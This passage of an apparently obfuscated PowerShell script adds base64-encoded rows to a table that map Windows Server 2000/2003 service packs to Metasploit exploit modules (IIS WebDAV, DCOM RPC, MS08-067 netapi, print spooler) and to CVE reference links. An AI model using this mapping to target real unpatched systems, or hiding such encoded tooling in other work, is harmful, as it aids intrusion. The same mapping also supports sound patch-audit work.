    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
